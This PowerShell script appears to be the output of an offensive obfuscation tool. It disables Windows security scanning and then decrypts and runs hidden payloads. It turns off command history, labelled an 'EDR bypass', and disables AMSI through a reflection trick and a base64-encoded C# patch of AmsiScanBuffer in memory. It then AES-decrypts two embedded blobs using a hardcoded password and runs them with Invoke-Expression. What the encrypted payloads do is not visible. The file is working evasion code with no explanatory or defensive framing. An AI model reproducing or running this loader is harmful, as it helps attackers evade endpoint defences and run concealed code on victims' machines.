$EncFunc0 = ("hbqqPCzrrQ/BhsGVjy1fQg==", "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")
$EncFunc1 = ("0VGxZ2oJHUNz/sCCv3pu6Q==", "8DsMqBe9oADk7puSSLTZVbrFs7/TiIg+cU6hWdDb82w4n1JyjI6dJdYCJhTh/cDZih0ur/IbMQ9UL+Y7AvNFeQ==")
$EncryptedFunctions = @($EncFunc0,$EncFunc1)
$Password="Q0_n<K3:Df"
$Salt="F9UX9aXsvw"
#EDR Bypass
Set-PSReadlineOption -HistorySaveStyle SaveNothing

#AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
(([Ref].Assembly.gettypes() | where {$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)

#AMSI Bypass 2
$AMSIBypass2encoded = "dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoADQAKAG4AYQBtAGUAcwBwAGEAYwBlACAAUgBhAG4AZABvAG0ATgBhAG0AZQBzAHAAYQBjAGUADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABSAGEAbgBkAG8AbQBDAGwAYQBzAHMADQAKACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACgASQBuAHQAUAB0AHIAIABoAE0AbwBkAHUAbABlACwAIABzAHQAcgBpAG4AZwAgAHAAcgBvAGMATgBhAG0AZQApADsADQAKACAAIAAgACAAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIAIgApAF0ADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIAIgApAF0ADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAVQBJAG4AdABQAHQAcgAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAE4AZQB3AFAAcgBvAHQAZQBjAHQALAAgAG8AdQB0ACAAdQBpAG4AdAAgAGwAcABmAGwATwBsAGQAUAByAG8AdABlAGMAdAApADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIASwBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgAsACAARQBuAHQAcgB5AFAAbwBpAG4AdAAgAD0AIAAiAFIAdABsAE0AbwB2AGUATQBlAG0AbwByAHkAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAIAA9ACAAZgBhAGwAcwBlACkAXQANAAoAIAAgACAAIAAgACAAIAAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIAB2AG8AaQBkACAATQBvAHYAZQBNAGUAbQBvAHIAeQAoAEkAbgB0AFAAdAByACAAZABlAHMAdAAsACAASQBuAHQAUAB0AHIAIABzAHIAYwAsACAAaQBuAHQAIABzAGkAegBlACkAOwANAAoADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAdgBvAGkAZAAgAFIAYQBuAGQAbwBtAEYAdQBuAGMAdABpAG8AbgAoACkADQAKACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAG4AdABQAHQAcgAgAFQAYQByAGcAZQB0AEQATABMACAAPQAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoACIAYQBtAHMAaQAuAGQAbABsACIAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAG4AdABQAHQAcgAgAFQAbwB0AGEAbABsAHkATgBvAHQAVABoAGEAdABCAHUAZgBmAGUAcgBZAG8AdQBSAEwAbwBvAGsAaQBuAGcARgBvAHIAUAB0AHIAIAA9ACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACgAVABhAHIAZwBlAHQARABMAEwALAAgACIAQQBtAHMAaQAiACAAKwAgACIAUwBjAGEAbgAiACAAKwAgACIAQgB1AGYAZgBlAHIAIgApADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUAIAA9ACAAKABVAEkAbgB0AFAAdAByACkANQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AGkAbgB0ACAAWgBlAHIAbwAgAD0AIAAwADsADQAKACAAIAAgACAAIAAgACAAIAAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABUAG8AdABhAGwAbAB5AE4AbwB0AFQAaABhAHQAQgB1AGYAZgBlAHIAWQBvAHUAUgBMAG8AbwBrAGkAbgBnAEYAbwByAFAAdAByACwAIABkAHcAUwBpAHoAZQAsACAAMAB4ADQAMAAsACAAbwB1AHQAIABaAGUAcgBvACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQgB5AHQAZQBbAF0AIABvAG4AZQAgAD0AIAB7ACAAMAB4ADMAMQAgAH0AOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQgB5AHQAZQBbAF0AIAB0AHcAbwAgAD0AIAB7ACAAMAB4AGYAZgAsACAAMAB4ADkAMAAgAH0AOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBuAHQAIABsAGUAbgBnAHQAaAAgAD0AIABvAG4AZQAuAEwAZQBuAGcAdABoACAAKwAgAHQAdwBvAC4ATABlAG4AZwB0AGgAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYgB5AHQAZQBbAF0AIABzAHUAbQAgAD0AIABuAGUAdwAgAGIAeQB0AGUAWwBsAGUAbgBnAHQAaABdADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAG8AbgBlAC4AQwBvAHAAeQBUAG8AKABzAHUAbQAsADAAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0AHcAbwAuAEMAbwBwAHkAVABvACgAcwB1AG0ALABvAG4AZQAuAEwAZQBuAGcAdABoACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAASQBuAHQAUAB0AHIAIAB1AG4AbQBhAG4AYQBnAGUAZABQAG8AaQBuAHQAZQByACAAPQAgAE0AYQByAHMAaABhAGwALgBBAGwAbABvAGMASABHAGwAbwBiAGEAbAAoADMAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE0AYQByAHMAaABhAGwALgBDAG8AcAB5ACgAcwB1AG0ALAAgADAALAAgAHUAbgBtAGEAbgBhAGcAZQBkAFAAbwBpAG4AdABlAHIALAAgADMAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE0AbwB2AGUATQBlAG0AbwByAHkAKABUAG8AdABhAGwAbAB5AE4AbwB0AFQAaABhAHQAQgB1AGYAZgBlAHIAWQBvAHUAUgBMAG8AbwBrAGkAbgBnAEYAbwByAFAAdAByACAAKwAgADAAeAAwADAAMQBiACwAIAB1AG4AbQBhAG4AYQBnAGUAZABQAG8AaQBuAHQAZQByACwAIAAzACkAOwANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAfQANAAoAfQA="
$AMSIBypass2 = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($AMSIBypass2encoded))
Add-Type -TypeDefinition $AMSIBypass2
[RandomNamespace.RandomClass]::RandomFunction()
if($Password -and $Salt)
{
$Index = 0
foreach($ef in $EncryptedFunctions)
{

[byte[]]$CipherText = [Convert]::FromBase64String($ef[1])
[byte[]]$InitVector = [Convert]::FromBase64String($ef[0])

$AES = [System.Security.Cryptography.Aes]::Create()

$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes($Password),[Text.Encoding]::ASCII.GetBytes($Salt),"SHA256",5)

$AES.Padding = "PKCS7"
$AES.KeySize = 256
$AES.Key = $Key.GetBytes(32)
$AES.IV = $InitVector

$AESDecryptor = $AES.CreateDecryptor()

$MemoryStream = New-Object System.IO.MemoryStream($CipherText,$True)
$CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream,$AESDecryptor,[System.Security.Cryptography.CryptoStreamMode]::Read)
$StreamReader = New-Object System.IO.StreamReader($CryptoStream)

$Message = $StreamReader.ReadToEnd()

$CryptoStream.Close()
$MemoryStream.Close()
$AES.Clear()

try {$Message | Invoke-Expression } catch { Write-Warning "Error loading function number $Index. Beware that this only affects the mentioned function so everything else should work fine." }

$Index++
}
}
